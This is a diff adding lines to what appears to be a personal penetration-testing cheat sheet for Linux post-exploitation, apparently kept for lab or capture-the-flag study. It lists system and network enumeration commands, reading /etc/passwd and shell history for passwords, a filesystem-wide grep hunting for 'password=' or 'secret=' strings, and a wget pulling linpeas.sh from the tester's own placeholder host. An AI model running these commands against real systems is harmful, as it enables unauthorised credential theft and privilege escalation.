@@ -18,6 +18,29 @@ sudo -l
 
 cat /etc/exports
 
+ps aux  (what users are running what tasks?)
+
+cat /etc/passwd  (get user info and what permissions you have)
+
+history (look for passwords or other intersting commands)
+
+ip a 
+
+ifconfig
+
+route || ip route
+
+arp -a
+
+netstat -ano (any local servers running with local ports?)
+
+netstat -tulpn
+
+ss -tulpn
+
+### PASSWORD HUNTING ###
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
++this will put out A LOT of stuff so make the query better with "password=" || "secret=" or something...
 
 ### SCRIPTS I THEN RUN ###
 wget http://my.box.ip.addr:port/linpeas.sh -O linpeas.sh
